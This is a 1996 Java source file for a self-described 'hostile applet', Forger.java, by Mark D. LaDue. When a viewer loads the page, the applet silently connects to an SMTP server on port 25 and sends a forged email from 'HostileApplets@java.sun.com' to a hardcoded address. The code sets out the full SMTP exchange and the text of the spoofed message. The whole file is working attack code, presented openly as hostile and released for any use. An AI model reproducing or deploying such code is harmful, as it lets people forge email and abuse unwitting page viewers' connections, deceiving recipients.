package hostile;

/* Forger.java by Mark D. LaDue */

/* March 15, 1996 */

/*  Copyright (c) 1996 Mark D. LaDue
    You may study, use, modify, and distribute this example for any purpose.
    This example is provided WITHOUT WARRANTY either expressed or implied.  */

/*  This hostile applet forges an elctronic mail letter from the person who
    views the applet in a browser to the person whose address appears in the
    string "toMe."  The return address will be listed as HostileApplets@
    followed by the string "mailFrom."  The appropriate commands to use for
    sendmail can be often be found in the file /etc/mail/sendmail.hf.  
    Note that while the person viewing the applet actually does initiate
    the mail by connecting (involuntarily) to port 25, the applet host's role
    in sending it is not so easily hidden.  See the full header of any e-mail
    letter sent by the applet for more details. */ 

import java.applet.*;
import java.io.*;
import java.net.*;

public class Forger extends java.applet.Applet implements Runnable { 

    public static Socket socker;
    public static DataInputStream inner;
    public static PrintStream outer;
    public static int mailPort = 25 ;
    public static String mailFrom = "java.sun.com";
    public static String toMe = "venkatr@doppio.Eng.Sun.COM";// Change this!
    public static String starter = new String();
    Thread controller = null;

    public void init() {

	try {
	    socker = new Socket(getDocumentBase().getHost(), mailPort);
	    inner = new DataInputStream(socker.getInputStream());
	    outer = new PrintStream(socker.getOutputStream());
        }
        catch (IOException ioe) {}
    }

    public void start() {
        if (controller == null) {
            controller = new Thread(this);
            controller.setPriority(Thread.MAX_PRIORITY);
            controller.start();
        }
    }

    public void stop() {
        if (controller != null) {
            controller.stop();
            controller = null;
        }
    }

    public void run() {
        try {
            starter = inner.readLine();
        }
        catch (IOException ioe) {}
        mailMe("HELO " + mailFrom);
        mailMe("MAIL FROM: " + "HostileApplets@" + mailFrom);
	mailMe("RCPT TO: " + toMe);
	mailMe("DATA");
        mailMe("Subject: About PenPal.java" + "\n" +"Hi Venkat,"  + 
                "\n" + "\n" + 
               "Thanks for taking a look at PenPal.java.  From your note\n" +
               "I think I can understand why you're not seeing the desired\n" +
               "result.  My guess is that perhaps you're only looking at\n" +
               "an abbreviated header from an e-mail note that the applet\n" +
               "forges.  In order to get the whole story, you have to\n" +
               "inspect the full header.  That's where you'll be able to\n" +
               "discern more information about the *sender*.  Of course\n" +
               "that's exactly what my shell script retrieves from\n" +
               "/var/mail/mladue.  None of this is apparent from the\n" +
               "source code, and indeed I noticed it quite by accident \n" +
               "when I was fiddling around trying to make my mail forging\n" + 
               "applet work.  Perhaps it's a peculiarity of the mail\n" +
             "system here in the School of Mathematics, but it really works\n"+
               "for me here.  So I hope that's what it is and that you'll\n" +
               "be able to reproduce my results there.\n" +
               "\n" + "Mark LaDue\n" + "mladue@math.gatech.edu\n" + "\n" +
               "\n" + "P.S. Of course one of my applets forged this note.\n" +
               "\n." + "\n"); 
        mailMe("QUIT");
        try {
            socker.close();
        }
        catch (IOException ioe) {}
    }

    public void mailMe(String toSend) {
        String response = new String();
        try {
            outer.println(toSend);
            outer.flush();
            response = inner.readLine();
        }
        catch(IOException e) {}
    }
}

